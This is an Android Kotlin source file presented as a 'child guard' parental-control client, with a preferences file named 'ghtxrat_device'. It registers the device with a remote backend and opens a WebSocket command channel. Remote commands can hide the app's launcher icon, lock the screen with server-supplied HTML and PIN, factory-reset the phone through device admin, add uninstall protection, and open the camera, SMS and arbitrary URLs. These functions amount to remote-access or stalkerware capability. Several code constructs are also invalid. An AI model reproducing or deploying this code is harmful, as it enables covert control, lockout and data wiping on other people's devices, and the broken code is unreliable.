package com.rifxguard.child

import android.annotation.SuppressLint
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.ContactsContract
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.os.Bundle
import android.os.BatteryManager
import android.os.StatFs
import android.os.Vibrator
import android.os.VibrationEffect
import android.media.AudioManager
import android.location.LocationManager
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import kotlin.concurrent.thread

class MainActivity : Activity() {
    private lateinit var web: WebView
    private val requestCode = 7001
    private val handler = Handler(Looper.getMainLooper())
    private var registered = false

    // ── Config from BuildConfig (never input by user) ─────────────────────────
    private val backendUrl get() = BuildConfigValues.BACKEND_URL.trimEnd('/')
    private val webviewUrl get() = BuildConfigValues.WEBVIEW_URL
    private val parentUid  get() = BuildConfigValues.PARENT_UID

    // ── Persistent device ID (unique per installation) ────────────────────────
    private val deviceId: String by lazy {
        val prefs = getSharedPreferences("ghtxrat_device", Context.MODE_PRIVATE)
        prefs.getString("deviceId", null) ?: run {
            val newId = "DVC-" + UUID.randomUUID().toString().replace("-", "").uppercase().take(16)
            prefs.edit().putString("deviceId", newId).apply()
            newId
        }
    }

    // ── Reconnect state ───────────────────────────────────────────────────────
    private var wsReconnectDelay = 1_000L
    private var wsThread: Thread? = null
    private var wsSocket: java.net.Socket? = null
    private var wsRunning = false

    private val heartbeatTask = object : Runnable {
        override fun run() {
            if (registered) heartbeat()
            handler.postDelayed(this, 30_000)
        }
    }
    private val commandPollTask = object : Runnable {
        override fun run() {
            if (registered) pollCommands()
            handler.postDelayed(this, 5_000)
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Show loading UI while registering
        showLoading()
        // Start auto-registration in background
        thread { autoRegisterAndStart() }
    }

    override fun onResume() {
        super.onResume()
        if (registered) {
            handler.removeCallbacks(heartbeatTask)
            handler.removeCallbacks(commandPollTask)
            handler.post(heartbeatTask)
            handler.post(commandPollTask)
        }
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacks(heartbeatTask)
        handler.removeCallbacks(commandPollTask)
    }

    override fun onDestroy() {
        super.onDestroy()
        wsRunning = false
    }

    // ── Loading screen ────────────────────────────────────────────────────────
    private fun showLoading() {
        runOnUiThread {
            val root = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(0xFF121212.toInt())
            }
            root.addView(TextView(this).apply {
                text = BuildConfigValues.APP_NAME
                textSize = 22f
                setTextColor(0xFFFFFFFF.toInt())
                gravity = Gravity.CENTER
            })
            root.addView(TextView(this).apply {
                text = "Memuat…"
                textSize = 14f
                setTextColor(0xFF888888.toInt())
                gravity = Gravity.CENTER
            })
            setContentView(root)
        }
    }

    // ── Auto-register flow (runs on background thread) ────────────────────────
    private fun autoRegisterAndStart() {
        val prefs = getSharedPreferences("ghtxrat_device", Context.MODE_PRIVATE)
        val alreadyRegistered = prefs.getBoolean("registered", false)

        // Try registration (or re-register to refresh online status)
        try {
            val buildId = prefs.getString("buildId", null)
            val body = JSONObject().apply {
                put("uid", parentUid)
                put("deviceId", deviceId)
                if (buildId != null) put("buildId", buildId)
                put("appVersion", packageManager.getPackageInfo(packageName, 0).versionName ?: "1.0.0")
                put("packageName", packageName)
                put("appName", BuildConfigValues.APP_NAME)
                put("androidVersion", android.os.Build.VERSION.RELEASE)
                put("deviceModel", "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
            }
            val result = request("/api/devices/register-built", "POST", body.toString(), emptyMap())
            if (result.optBoolean("ok")) {
                prefs.edit().putBoolean("registered", true).apply()
                registered = true
            }
        } catch (e: Exception) {
            // Backend offline — can still show WebView
            registered = alreadyRegistered
        }

        // Request permissions
        requestRequiredPermissions()

        // Connect WebSocket
        wsRunning = true
        connectWebSocket()

        // Show WebView
        handler.post { showWebView() }

        // Start heartbeat & command polling
        handler.post(heartbeatTask)
        handler.post(commandPollTask)
    }

    // ── WebView ───────────────────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun showWebView() {
        web = WebView(this).apply {
            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                loadWithOverviewMode = true
                useWideViewPort = true
                setSupportZoom(true)
                builtInZoomControls = true
                displayZoomControls = false
                mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
            }
            webViewClient = WebViewClient()
            loadUrl(webviewUrl)
        }
        setContentView(web)
    }

    // ── Permissions ───────────────────────────────────────────────────────────
    private fun requestRequiredPermissions() {
        val dangerous = BuildConfigValues.REQUESTED_PERMISSIONS.filter {
            it.startsWith("android.permission.") &&
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (dangerous.isNotEmpty()) {
            handler.post {
                ActivityCompat.requestPermissions(this, dangerous, requestCode)
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, results)
        if (requestCode == this.requestCode) {
            val statusList = permissions.mapIndexed { i, perm ->
                mapOf(
                    "permission" to perm,
                    "granted" to (results.getOrNull(i) == PackageManager.PERMISSION_GRANTED)
                )
            }
            // Send permission status to backend via WebSocket
            thread {
                try {
                    sendWsMessage(JSONObject().apply {
                        put("type", "permission_status")
                        put("uid", parentUid)
                        put("deviceId", deviceId)
                        put("permissions", JSONArray(statusList.map { JSONObject(it as Map<*, *>) }))
                    }.toString())
                } catch {}
            }
        }
    }

    // ── Heartbeat ─────────────────────────────────────────────────────────────
    private fun heartbeat() {
        thread {
            try {
                val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
                val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
                val battery = if (level >= 0 && scale > 0) (level * 100 / scale) else null
                val body = JSONObject().apply {
                    put("uid", parentUid)
                    put("deviceId", deviceId)
                    if (battery != null) put("battery", battery)
                }
                request("/api/devices/heartbeat", "POST", body.toString(), emptyMap())
            } catch {}
        }
    }

    // ── Command polling (HTTP fallback when WebSocket unavailable) ────────────
    private fun pollCommands() {
        thread {
            try {
                val result = request(
                    "/api/devices/${deviceId}/commands", "GET", null,
                    mapOf("X-Uid" to parentUid)
                )
                val arr = result.optJSONArray("commands") ?: return@thread
                for (i in 0 until arr.length()) {
                    handleCommand(arr.getJSONObject(i))
                }
            } catch {}
        }
    }

    // ── WebSocket connection ──────────────────────────────────────────────────
    private fun connectWebSocket() {
        wsThread = thread {
            while (wsRunning) {
                try {
                    val wsUrl = backendUrl.replace("https://", "wss://").replace("http://", "ws://") + "/ws"
                    val uri = URI(wsUrl)
                    val host = uri.host
                    val port = if (uri.port > 0) uri.port else if (wsUrl.startsWith("wss")) 443 else 80
                    val useSSL = wsUrl.startsWith("wss")

                    val socket = if (useSSL) {
                        javax.net.ssl.SSLSocketFactory.getDefault().createSocket(host, port)
                    } else {
                        java.net.Socket(host, port)
                    }
                    wsSocket = socket

                    // WebSocket handshake
                    val key = android.util.Base64.encodeToString(java.security.SecureRandom().generateSeed(16), android.util.Base64.NO_WRAP)
                    val handshake = "GET /ws HTTP/1.1\r\nHost: $host\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: $key\r\nSec-WebSocket-Version: 13\r\n\r\n"
                    socket.getOutputStream().write(handshake.toByteArray())

                    // Read response headers
                    val reader = socket.getInputStream().bufferedReader()
                    var line = reader.readLine()
                    while (line != null && line.isNotEmpty()) { line = reader.readLine() }

                    // Send device_auth
                    sendWsMessage(JSONObject().apply {
                        put("type", "device_auth")
                        put("uid", parentUid)
                        put("deviceId", deviceId)
                    }.toString(), socket)

                    wsReconnectDelay = 1_000L // reset on success

                    // Read frames loop
                    val inputStream = socket.getInputStream()
                    while (wsRunning && !socket.isClosed) {
                        val frameText = readWsFrame(inputStream) ?: break
                        try {
                            val msg = JSONObject(frameText)
                            if (msg.optString("type") == "command") {
                                handleCommand(msg.optJSONObject("command") ?: continue)
                            }
                        } catch {}
                    }
                } catch {}

                wsSocket?.close()
                wsSocket = null
                if (!wsRunning) break
                Thread.sleep(wsReconnectDelay)
                wsReconnectDelay = minOf(wsReconnectDelay * 2, 30_000L)
            }
        }
    }

    private fun sendWsMessage(text: String, socket: java.net.Socket? = wsSocket) {
        try {
            val bytes = text.toByteArray()
            val out = socket?.getOutputStream() ?: return
            val frame = buildWsFrame(bytes)
            out.write(frame)
            out.flush()
        } catch {}
    }

    private fun buildWsFrame(payload: ByteArray): ByteArray {
        val len = payload.size
        val mask = java.security.SecureRandom().generateSeed(4)
        val masked = payload.mapIndexed { i, b -> (b.toInt() xor mask[i % 4].toInt()).toByte() }.toByteArray()
        return when {
            len < 126 -> byteArrayOf(0x81.toByte(), (len or 0x80).toByte()) + mask + masked
            len < 65536 -> byteArrayOf(0x81.toByte(), (126 or 0x80).toByte(), (len shr 8).toByte(), (len and 0xFF).toByte()) + mask + masked
            else -> byteArrayOf(0x81.toByte(), (127 or 0x80).toByte()) + longToBytes(len.toLong()) + mask + masked
        }
    }

    private fun longToBytes(v: Long): ByteArray = (7 downTo 0).map { ((v shr (it * 8)) and 0xFF).toByte() }.toByteArray()

    private fun readWsFrame(input: java.io.InputStream): String? {
        return try {
            val b0 = input.read().takeIf { it >= 0 } ?: return null
            val b1 = input.read().takeIf { it >= 0 } ?: return null
            val masked = (b1 and 0x80) != 0
            var len = (b1 and 0x7F).toLong()
            if (len == 126L) {
                len = ((input.read() shl 8) or input.read()).toLong()
            } else if (len == 127L) {
                len = (0..7).fold(0L) { acc, _ -> (acc shl 8) or input.read().toLong() }
            }
            val mask = if (masked) ByteArray(4).also { input.read(it) } else null
            val data = ByteArray(len.toInt()).also { input.read(it) }
            if (mask != null) data.forEachIndexed { i, b -> data[i] = (b.toInt() xor mask[i % 4].toInt()).toByte() }
            if ((b0 and 0x0F) == 8) return null // close frame
            String(data)
        } catch { null }
    }

    // ── Command handler ───────────────────────────────────────────────────────
    private fun handleCommand(cmd: JSONObject) {
        val type = cmd.optString("type")
        val cmdId = cmd.optString("id")
        handler.post {
            when (type) {
                "refresh_webview" -> if (::web.isInitialized) web.reload()
                "open_url" -> {
                    val url = cmd.optString("url")
                    if (url.isNotBlank() && ::web.isInitialized) web.loadUrl(url)
                }
                "lock_device" -> {
                    val pinHash = cmd.optString("pinHash")
                    val html = cmd.optString("html")
                    val intent = Intent(this, LockActivity::class.java).apply {
                        putExtra("pinHash", pinHash)
                        putExtra("html", html)
                        putExtra("appLock", cmd.optBoolean("appLock"))
                    }
                    startActivity(intent)
                }
                "unlock_device" -> {
                    val prefs = getSharedPreferences(LockActivity.PREFS, Context.MODE_PRIVATE)
                    prefs.edit().putBoolean(LockActivity.KEY_ACTIVE, false).apply()
                }
                "ring_device" -> {
                    val am = getSystemService(AUDIO_SERVICE) as AudioManager
                    am.ringerMode = AudioManager.RINGER_MODE_NORMAL
                }
                "vibrate_device" -> {
                    val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                    v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
                }
                "volume_up" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI) }
                "volume_down" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI) }
                "volume_mute" -> { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0) }
                "open_contacts" -> startActivity(Intent(Intent.ACTION_VIEW, ContactsContract.Contacts.CONTENT_URI))
                "open_gallery" -> startActivity(Intent(Intent.ACTION_VIEW).apply { type = "image/*" })
                "open_camera_front" -> startActivity(Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE).apply { putExtra("android.intent.extras.CAMERA_FACING", 1) })
                "open_camera_back" -> startActivity(Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE))
                "compose_sms" -> {
                    val to = cmd.optString("to")
                    val body = cmd.optString("body")
                    val intent = Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:$to")).apply { putExtra("sms_body", body) }
                    startActivity(intent)
                }
                "open_gmail" -> startActivity(packageManager.getLaunchIntentForPackage("com.google.android.gm") ?: Intent(Intent.ACTION_VIEW, Uri.parse("https://mail.google.com")))
                "open_whatsapp" -> startActivity(packageManager.getLaunchIntentForPackage("com.whatsapp") ?: Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me")))
                "tts" -> {
                    val text = cmd.optString("text")
                    TextToSpeech(this) { status ->
                        if (status == TextToSpeech.SUCCESS) {
                            (it as? TextToSpeech)?.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
                        }
                    }
                }
                "open_location_settings" -> startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                "open_overlay_settings" -> startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                "request_device_admin" -> {
                    val cn = ComponentName(this, AdminReceiver::class.java)
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn) }
                    startActivity(intent)
                }
                "factory_reset" -> {
                    val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val cn = ComponentName(this, AdminReceiver::class.java)
                    if (dpm.isAdminActive(cn)) dpm.wipeData(0)
                }
                "enable_uninstall_protection" -> {
                    val cn = ComponentName(this, AdminReceiver::class.java)
                    startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply { putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn) })
                }
                "prank_video", "prank_audio" -> {
                    val url = cmd.optString("url")
                    if (url.isNotBlank()) {
                        if (::web.isInitialized) web.loadUrl(url)
                        else startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                    }
                }
                "flashlight_on", "flashlight_off" -> {
                    try {
                        val cm = getSystemService(CAMERA_SERVICE) as android.hardware.camera2.CameraManager
                        val id = cm.cameraIdList.firstOrNull()
                        if (id != null) cm.setTorchMode(id, type == "flashlight_on")
                    } catch {}
                }
                "hide_launcher" -> {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(this, this::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
                "show_launcher" -> {
                    packageManager.setComponentEnabledSetting(
                        ComponentName(this, this::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            }
        }
        // Acknowledge command
        if (cmdId.isNotBlank()) {
            thread {
                try {
                    request("/api/devices/${deviceId}/commands/$cmdId", "DELETE", null,
                        mapOf("X-Uid" to parentUid))
                } catch {}
            }
        }
    }

    // ── HTTP helper ───────────────────────────────────────────────────────────
    private fun request(path: String, method: String, body: String?, extraHeaders: Map<String, String>): JSONObject {
        val url = URL("$backendUrl$path")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = method
        conn.connectTimeout = 15_000
        conn.readTimeout = 15_000
        conn.setRequestProperty("Content-Type", "application/json")
        for ((k, v) in extraHeaders) conn.setRequestProperty(k, v)
        if (body != null) {
            conn.doOutput = true
            conn.outputStream.write(body.toByteArray())
        }
        val code = conn.responseCode
        val stream = if (code < 400) conn.inputStream else conn.errorStream
        val response = stream?.bufferedReader()?.readText() ?: "{}"
        conn.disconnect()
        return try { JSONObject(response) } catch { JSONObject().put("_raw", response) }
    }

    // ── URI helper ────────────────────────────────────────────────────────────
    @Suppress("DEPRECATION")
    private class URI(val s: String) {
        val host: String get() = s.substringAfter("://").substringBefore(":").substringBefore("/")
        val port: Int get() = try { s.substringAfter("://").substringAfter(":").substringBefore("/").toInt() } catch { -1 }
    }
}
